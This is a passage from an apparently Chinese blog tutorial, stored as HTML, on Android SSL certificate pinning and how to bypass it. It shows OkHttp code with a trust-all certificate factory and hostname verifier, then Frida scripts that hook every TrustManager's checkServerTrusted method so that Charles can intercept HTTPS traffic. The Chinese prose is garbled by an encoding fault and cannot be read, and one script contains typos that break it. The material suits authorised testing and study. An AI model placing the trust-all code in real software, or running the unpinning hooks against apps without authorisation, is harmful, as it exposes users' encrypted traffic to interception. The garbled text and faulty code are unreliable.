class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">               <span class="type">OkHttpClient</span> <span class="variable">mClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>().newBuilder().sslSocketFactory(HttpsTrustAllCerts.createSSLSocketFactory(),<span class="keyword">new</span> <span class="title class_">HttpsTrustAllCerts</span>()).hostnameVerifier(<span class="keyword">new</span> <span class="title class_">HttpsTrustAllCerts</span>.TrustAllHostnameVerifier()).build();</span><br><span class="line">               <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                       .url(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">                       .build();</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> mClient.newCall(request).execute();</span><br><span class="line">                   <span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> response.body().string();</span><br><span class="line">                   showResponse(responseData);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;).start();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¬äºŒç§æ ¡éªŒæ–¹å¼ï¼šOKHttp.builderæ ¡éªŒ</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendRequestWithOkHttp2</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">               <span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">               <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                       .url(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">                       .build();</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute();</span><br><span class="line">                   <span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> response.body().string();</span><br><span class="line">                   showResponse(responseData);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;).start();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¬ä¸‰ç§æ ¡éªŒï¼šCertificatePinnerè¯ä¹¦ç»‘å®š</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendRequestWithOkHttp3</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">               <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CA_DOMAIN</span> <span class="operator">=</span> <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">               <span class="comment">//è·å–å…¬é’¥ï¼š</span></span><br><span class="line">               <span class="comment">//openssl s_client -connect www.baidu.com:443 -servername www.baidu.com | openssl x509 -pubkey -noout | openssl rsa -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64</span></span><br><span class="line">               <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CA_PUBLIC_KEY</span> <span class="operator">=</span> <span class="string">&quot;sha256/Zhv4cvwdHmEmE0edWEcIdmLfwsqxrrOmp+vbngwNnrU=&quot;</span>;</span><br><span class="line">               <span class="type">CertificatePinner</span> <span class="variable">pinner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CertificatePinner</span>.Builder()</span><br><span class="line">                       .add(CA_DOMAIN,CA_PUBLIC_KEY)</span><br><span class="line">                       .build();</span><br><span class="line">               <span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>().newBuilder().certificatePinner(pinner).build();</span><br><span class="line">               <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                       .url(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">                       .build();</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute();</span><br><span class="line">                   <span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> response.body().string();</span><br><span class="line">                   showResponse(responseData);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;).start();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="ã€ä¸¾ä¾‹ã€‘X509TrustManageræ ¡éªŒå®ç°"><a href="#ã€ä¸¾ä¾‹ã€‘X509TrustManageræ ¡éªŒå®ç°" class="headerlink" title="ã€ä¸¾ä¾‹ã€‘X509TrustManageræ ¡éªŒå®ç°"></a>ã€ä¸¾ä¾‹ã€‘X509TrustManageræ ¡éªŒå®ç°</h2><h3 id="X509TrustManagerç±»ä»‹ç»"><a href="#X509TrustManagerç±»ä»‹ç»" class="headerlink" title="X509TrustManagerç±»ä»‹ç»"></a>X509TrustManagerç±»ä»‹ç»</h3><p>åœ¨JSSEä¸­ï¼Œè¯ä¹¦ä¿¡ä»»ç®¡ç†å™¨ç±»å°±æ˜¯å®ç°äº†æ¥å£X509TrustManagerçš„ç±»ã€‚æˆ‘ä»¬å¯ä»¥è‡ªå·±å®ç°è¯¥æ¥å£ï¼Œè®©å®ƒä¿¡ä»»æˆ‘ä»¬æŒ‡å®šçš„è¯ä¹¦ã€‚</p><p>æ¥å£X509TrustManageræœ‰ä¸‹è¿°ä¸‰ä¸ªå…¬æœ‰çš„æ–¹æ³•éœ€è¦æˆ‘ä»¬å®ç°ï¼š</p><p><strong>â‘´ void checkClientTrusted(X509Certificate[] chain, String authType)throws CertificateException</strong></p><p>è¯¥æ–¹æ³•æ£€æŸ¥å®¢æˆ·ç«¯çš„è¯ä¹¦ï¼Œè‹¥ä¸ä¿¡ä»»è¯¥è¯ä¹¦åˆ™æŠ›å‡ºå¼‚å¸¸ã€‚ç”±äºæˆ‘ä»¬ä¸éœ€è¦å¯¹å®¢æˆ·ç«¯è¿›è¡Œè®¤è¯ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æ‰§è¡Œé»˜è®¤çš„ä¿¡ä»»ç®¡ç†å™¨çš„è¿™ä¸ªæ–¹æ³•ã€‚JSSEä¸­ï¼Œé»˜è®¤çš„ä¿¡ä»»ç®¡ç†å™¨ç±»ä¸ºTrustManagerã€‚</p><p><strong>â‘µ void checkServerTrusted(X509Certificate[] chain, String authType)throws CertificateException</strong></p><p>è¯¥æ–¹æ³•æ£€æŸ¥æœåŠ¡å™¨çš„è¯ä¹¦ï¼Œè‹¥ä¸ä¿¡ä»»è¯¥è¯ä¹¦åŒæ ·æŠ›å‡ºå¼‚å¸¸ã€‚é€šè¿‡è‡ªå·±å®ç°è¯¥æ–¹æ³•ï¼Œå¯ä»¥ä½¿ä¹‹ä¿¡ä»»æˆ‘ä»¬æŒ‡å®šçš„ä»»ä½•è¯ä¹¦ã€‚åœ¨å®ç°è¯¥æ–¹æ³•æ—¶ï¼Œä¹Ÿå¯ä»¥ç®€å•çš„ä¸åšä»»ä½•å¤„ç†ï¼Œå³ä¸€ä¸ªç©ºçš„å‡½æ•°ä½“ï¼Œç”±äºä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå®ƒå°±ä¼šä¿¡ä»»ä»»ä½•è¯ä¹¦ã€‚</p><p><strong>â‘¶ X509Certificate[] getAcceptedIssuers()</strong></p><p>è¿”å›å—ä¿¡ä»»çš„X509è¯ä¹¦æ•°ç»„ã€‚</p><p>è‡ªå·±å®ç°äº†ä¿¡ä»»ç®¡ç†å™¨ç±»ï¼Œå¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿ</p><p>ç±»HttpsURLConnectionä¼¼ä¹å¹¶æ²¡æœ‰æä¾›æ–¹æ³•è®¾ç½®ä¿¡ä»»ç®¡ç†å™¨ã€‚å…¶å®ï¼ŒHttpsURLConnectioné€šè¿‡SSLSocketæ¥å»ºç«‹ä¸HTTPSçš„å®‰å…¨è¿æ¥ï¼ŒSSLSocketå¯¹è±¡æ˜¯ç”±SSLSocketFactoryç”Ÿæˆçš„ã€‚HttpsURLConnectionæä¾›äº†æ–¹æ³•setSSLSocketFactory(SSLSocketFactory)è®¾ç½®å®ƒä½¿ç”¨çš„SSLSocketFactoryå¯¹è±¡ã€‚SSLSocketFactoryé€šè¿‡SSLContextå¯¹è±¡æ¥è·å¾—ï¼Œåœ¨åˆå§‹åŒ–SSLContextå¯¹è±¡æ—¶ï¼Œå¯æŒ‡å®šä¿¡ä»»ç®¡ç†å™¨å¯¹è±¡ã€‚ä¸‹é¢ç”¨ä¸€ä¸ªå›¾ç®€å•è¡¨ç¤ºè¿™å‡ ä¸ªJSSEç±»çš„å…³ç³»ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062008386.png" alt="image-20240706200808341"> </p><h3 id="SSLPinningåŸç†-ä»£ç å®ç°"><a href="#SSLPinningåŸç†-ä»£ç å®ç°" class="headerlink" title="SSLPinningåŸç†&amp;ä»£ç å®ç°"></a>SSLPinningåŸç†&amp;ä»£ç å®ç°</h3><p>åŸç†æ˜¯â€”&gt;ï¼ˆä¸ä¿¡ä»»ç³»ç»Ÿåº“è¯ä¹¦ï¼Œåªä¿¡ä»»è‡ªå·±çš„è¯ä¹¦ï¼‰</p><p>1ã€æ­£å¸¸æƒ…å†µï¼Œè¦æ˜¯ä¸å¯¹<code>X509TrustManager</code>æ¥å£ä¸­çš„æ–¹æ³•ï¼ˆ<strong>checkServerTrusted</strong>ï¼‰è¿›è¡Œé‡å†™çš„è¯ï¼Œå®¢æˆ·ç«¯é»˜è®¤æ˜¯ä¿¡ä»»æ‰€æœ‰è¯ä¹¦çš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061940020.png" alt="image.png"> </p><p>2ã€ä½†å¦‚æœæœ‰åšäº†æ ¡éªŒçš„è¯ï¼Œå®¢æˆ·ç«¯ä¼šæ ¹æ®è®¾ç½®æ ¡éªŒæœåŠ¡ç«¯çš„è¯ä¹¦ã€‚</p><p>ä¸‹å›¾ä¸­çš„ä»£ç ï¼Œæ˜¯è‡ªå·±è®¾ç½®äº†ä¸€ä¸ªè¯ä¹¦ï¼ˆCAè¯ä¹¦ç”³è¯·æ˜¯è¦é’±çš„ï¼‰ï¼Œä½†å¦‚æœæ˜¯è‡ªå·±åªåšçš„è¯ä¹¦ï¼Œæ‰‹æœºæ˜¯ä¸è®¤å¯çš„ï¼Œæ‰€æœ‰ç”¨ä»£ç å®ç°äº†æ ¡éªŒã€‚ã€‚ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061941677.png" alt="image.png"> </p><p>3ã€ä»£ç ä¸­å¼•å…¥äº†trustManagersï¼Œ<code>trustManagers</code>æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚åœ¨trustManagersé‡Œé¢åŒ…å«äº†ä¸€ä¸ªkeyStoreï¼ŒkeyStoreé‡Œé¢å°±æ˜¯æˆ‘ä»¬å®šä¹‰å¥½çš„è¯ä¹¦    </p><p>æ‰€ä»¥ï¼Œå°±æ˜¯åœ¨trustManagersä¸­å­˜æ”¾äº†æˆ‘ä»¬è‡ªå·±å®šä¹‰å¥½çš„è¯ä¹¦ï¼Œæˆ‘ä»¬æ‰å¯ä»¥æ ¡éªŒé€šè¿‡ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061942299.png" alt="image.png"> </p><p>æ‰€ä»¥ï¼Œè¿™å—é’ˆå¯¹ä¸å®¢æˆ·ç«¯æ¥è¯´ï¼Œåšäº†SSLè¯ä¹¦ç»‘å®šä¹‹åï¼Œé»˜è®¤æ˜¯ä¸ä¿¡ä»»ç³»ç»Ÿè¯ä¹¦åˆ—è¡¨ä¸­çš„è¯ä¹¦çš„ã€‚ç®€å•æ¥è¯´å°±æ˜¯ï¼Œå³æ—¶å°†Charlesè¯ä¹¦æ”¾åˆ°äº†ç³»ç»Ÿè¯ä¹¦åˆ—è¡¨ä¸­ï¼Œç›¸å¯¹äºè®¾ç½®äº†trustManagersçš„å®¢æˆ·ç«¯è€Œè¨€ï¼ŒæœåŠ¡ç«¯ç»™åˆ°<code>Charle</code>è¯ä¹¦ä¸æ˜¯åœ¨å®šä¹‰å¥½çš„è¯ä¹¦å•†åº—ä¸­ï¼Œæ‰€ä»¥è¿™å—ä¼šæ ¡éªŒä¸é€šè¿‡ã€‚</p><p>4ã€ â€œ<strong>TrustManager[]  trustManagers</strong>â€œ ä¿¡ä»»ç®¡ç†å™¨ã€‚</p><p>trustManageræ˜¯ä¸€ä¸ªæ¥å£ï¼Œåœ¨é‡Œé¢å®šä¹‰äº†å®ç°ç±»ï¼Œè¿™å—ç”¨çš„æ˜¯<strong>X509TrustManagerç±»</strong>ï¼Œé‡Œé¢å®šä¹‰äº†ä¸€ä¸ª <strong>checkServerTrusted</strong>æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š</p><p>å¹³å¸¸é’ˆå¯¹APPçš„æ ¡éªŒé€»è¾‘ä¸€èˆ¬éƒ½æ˜¯å†™åœ¨è¿™ä¸ªæ–¹æ³•é‡Œé¢çš„</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061948034.png" alt="image.png"> </p><p>è¿™å—å¦‚æœå°† <strong>checkServerTrusted</strong>æ–¹æ³•ä½“ç½®ç©ºï¼Œé»˜è®¤æ˜¯ä¿¡ä»»æ‰€æœ‰è¯ä¹¦çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœé®æ©ä¸ªè®¾ç½®äº†ï¼Œå³ä½¿Charlesçš„è¯ä¹¦ä¸åœ¨ç³»ç»Ÿè¯ä¹¦åˆ—è¡¨ä¸­ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸æŠ“åŒ…çš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061950840.png" alt="image-20240706195000810">  </p><p>åŒç†ï¼Œå¦‚æœè¦å®ç°SSLPinningæ ¡éªŒï¼Œé‚£å°±å¯ä»¥å¯¹ <strong>checkServerTrusted</strong>æ–¹æ³•è¿›è¡Œé‡å†™ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509TrustManager tm, X509Certificate[] chain,</span></span><br><span class="line"><span class="params">        String authType, OpenSSLSocketImpl socket)</span> <span class="keyword">throws</span> CertificateException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!checkTrusted(<span class="string">&quot;checkServerTrusted&quot;</span>, tm, chain, authType, Socket.class, socket)</span><br><span class="line">            &amp;&amp; !checkTrusted(<span class="string">&quot;checkServerTrusted&quot;</span>, tm, chain, authType, String.class,</span><br><span class="line">                             socket.getHandshakeSession().getPeerHost())) &#123;</span><br><span class="line">        tm.checkServerTrusted(chain, authType);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5ã€æ‰€ä»¥ï¼Œç«™åœ¨æ¸—é€è§’åº¦è€Œè¨€ï¼Œæˆ‘ä»¬åªéœ€è¦å°†ä¸ä¿¡ä»»çš„ä»£ç ç»™ä»–hookæ‰å°±å¯ä»¥äº†ã€‚</p><p>åœ¨ <strong>checkServerTrusted</strong>æ–¹æ³•å¤„æ‰“æ–­ç‚¹ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹å®ƒæœåŠ¡ç«¯è¯ä¹¦æ ¡éªŒçš„ä¿¡ä»»è¿‡ç¨‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061958390.png" alt="image.png"> </p><p>æœ‰ä¸€ä¸ªå˜é‡ <code>&quot;chain&quot;</code>ï¼Œè¿™ä¸ªé‡Œé¢å°±æ˜¯å®ƒçš„è¯ä¹¦æ ¡éªŒé“¾ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407061958221.png" alt="image.png"> </p><p>å¦‚æœæ ¡éªŒä¸é€šè¿‡ï¼Œå°±ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚è¿™å—å°†å®ƒç›´æ¥ç»™hookæ‰ã€‚ã€‚ã€‚</p><h1 id="0x03-Frida-Hookå®ç°sslunpinning"><a href="#0x03-Frida-Hookå®ç°sslunpinning" class="headerlink" title="0x03 Frida Hookå®ç°sslunpinning"></a>0x03 Frida Hookå®ç°sslunpinning</h1><h2 id="checkServerTrusted-æ–¹æ³•"><a href="#checkServerTrusted-æ–¹æ³•" class="headerlink" title="checkServerTrusted æ–¹æ³•"></a>checkServerTrusted æ–¹æ³•</h2><p>æ ¹æ®å‰é¢çš„ä»£ç ï¼Œå¯ä»¥å¾—åˆ°<code>checkServerTrusted</code>æ ¡éªŒçš„æ•´ä¸ªé€»è¾‘å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checkServerTrustedæ–¹æ³• â€”â€”â€”â€”&gt; å½’å±äºX509TrustManagerç±»</span><br><span class="line">X509TrustManagerç±»â€”â€”â€”â€”&gt;æ˜¯TrustManageræ¥å£çš„ä¸€ä¸ªå®ç°ç±»</span><br><span class="line">TrustManager[]æ•°ç»„â€”â€”â€”â€”&gt;é‡Œé¢å®šä¹‰äº†æ‰€æœ‰éœ€è¦æ ¡éªŒçš„å†…å®¹</span><br></pre></td></tr></table></figure><p>X509TrustManagerç±»æœ‰ä¸‰ä¸ªæ–¹æ³•ï¼š</p><ul><li>checkServerTrustedï¼šæ ¡éªŒæœåŠ¡ç«¯</li><li>checkClientTrustedï¼šæ ¡éªŒå®¢æˆ·ç«¯</li><li>getAcceptIssuersï¼šè¯ä¹¦ä¿¡ä»»é“¾</li></ul><p>æ‰€ä»¥ï¼ŒHookçš„åŸç†å°±æ˜¯ï¼š<strong>å°†æ‰€æœ‰å®ç°äº† TrustManager æ¥å£å®ç°ç±»ä¸­çš„ checkServerTrusted æ–¹æ³•ç»™hookæ‰</strong></p><p>1ã€é¦–å…ˆï¼Œæšä¸¾è¿›è¡ŒåŒ¹é…ï¼Œæ‰“å°å‡ºæ‰€æœ‰å®ç°äº†<code>TrustManager æ¥å£</code>çš„ç±»</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">preform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥åˆ¤æ–­æŸä¸ªç±»æ˜¯å¦ç»§æ‰¿äº†æŸä¸ªæ¥å£</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">checkIsImplementInterface</span>(<span class="params">classNameï¼ŒinterfaceName</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">                <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(cls.<span class="property">class</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span> (interfaceName.<span class="property">class</span>.<span class="title function_">isAssignableFrom</span>(cls.<span class="property">class</span>))&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//é¦–å…ˆå£°æ˜TrustManageræ¥å£</span></span><br><span class="line">        <span class="keyword">var</span> trustManagerInterface =<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.TrustManager&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//è°ƒç”¨Fridaçš„APIï¼šJava.enumerateLoadedClassesæšä¸¾å†…å­˜ä¸­çš„æ‰€æœ‰ç±»</span></span><br><span class="line">        <span class="comment">//å†è°ƒç”¨å‰é¢å®šä¹‰å¥½çš„å‡½æ•°checkIsImplementInterfaceæ¥åˆ¤æ–­å½“å‰ç±»æ˜¯å¦å®ç°äº†TrustManageræ¥å£</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">className</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_">checkIsImplementInterface</span>(className,trustManagerInterface))&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(className);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                consoole.<span class="title function_">log</span>(<span class="string">&#x27;done!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨åï¼ŒæˆåŠŸæ‰“å°å‡ºäº†å®ç°äº†TrustManageræ¥å£çš„ç±»ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062022974.png" alt="image.png"> </p><p>2ã€å°†å®ç°æ¥å£ç±»ä¸­çš„checkServerTrustedæ–¹æ³•hookæ‰</p><p>è¿™å—ä½¿ç”¨forå¾ªç¯æ‰“å°æ¥åšï¼Œæ˜¯ä¸ºäº†é˜²æ­¢æœ‰é‡è½½çš„æƒ…å†µã€‚ã€‚ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥åˆ¤æ–­æŸä¸ªç±»æ˜¯å¦å®ç°æˆ–ç»§æ‰¿äº†æŸä¸ªæ¥å£</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkIsImplementInterface</span>(<span class="params">className, interfaceName</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (interfaceName.<span class="property">class</span>.<span class="title function_">isAssignableFrom</span>(cls.<span class="property">class</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> trustManagerInterface = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.net.ssl.TrustManager&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">className</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_">checkIsImplementInterface</span>(className, trustManagerInterface))&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(className); <span class="comment">//æ‰“å°å‡ºå®ç°äº†TrustManageræ¥å£çš„ç±»å</span></span><br><span class="line">                <span class="keyword">var</span> targetClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">                <span class="keyword">var</span> len = targetClass[<span class="string">&quot;checkServerTrusted&quot;</span>].<span class="property">overloads</span>.<span class="property">length</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">                    targetClass[<span class="string">&quot;checkServerTrusted&quot;</span>].<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;checkServerTrusted called&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">                </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;done&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">  &#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062023359.png" alt="image-20240706202348324"> </p><p>å¯ä»¥çœ‹åˆ°è¿™å—ä½¿ç”¨Charleæ˜¯å¯ä»¥æˆåŠŸæŠ“å–åˆ°æ•°æ®åŒ…çš„ï¼Œå†…å®¹ä¹ŸæˆåŠŸåŠ è½½å‡ºæ¥äº†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062024193.png" alt="image.png"> </p><p>3ã€ä½†æ˜¯Fridaè„šæœ¬æŠ¥é”™äº†ï¼ŒæŠ¥é”™åŸå› æ˜¯è¯´ â€œhookçš„æ–¹æ³•æ²¡æœ‰è®¾å®šè¿”å›å€¼â€</p><p>è¿™å—çŒœæµ‹åŸå› ä¸ºï¼šhookçš„ä¸€äº›ç±»çš„checkServerTrustedæ–¹æ³•ï¼Œæœ‰çš„æ˜¯æœ‰è¿”å›å€¼çš„ï¼Œæœ‰çš„æ²¡æœ‰ã€‚è¿™å—ä¿®æ”¹ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062025263.png" alt="image.png"> </p><h2 id="certificatePinnerè¯ä¹¦ç»‘å®š"><a href="#certificatePinnerè¯ä¹¦ç»‘å®š" class="headerlink" title="certificatePinnerè¯ä¹¦ç»‘å®š"></a>certificatePinnerè¯ä¹¦ç»‘å®š</h2><p>certificatePinnerçš„ä½œç”¨å°±æ˜¯æå‰åšä¸€ä¸ªè¯ä¹¦æ ¡éªŒï¼Œå°†è¯ä¹¦çš„å“ˆå¸Œå€¼æå‰é¢„å­˜è¿›å»ï¼Œæ¯æ¬¡å»ºç«‹è¿æ¥çš„æ—¶å€™ï¼Œä¼šå…ˆæ ¡éªŒæœåŠ¡ç«¯è¯ä¹¦çš„å“ˆå¸Œæ˜¯å¦å’Œæœ¬åœ°åŒ¹é…ã€‚</p><p>è¿™å—ä»¥OkHttpClientåˆå§‹åŒ–éƒ¨åˆ†æ”¹ä¸ºä¸‹é¢ä»£ç é”å®šè¯ä¹¦ï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title 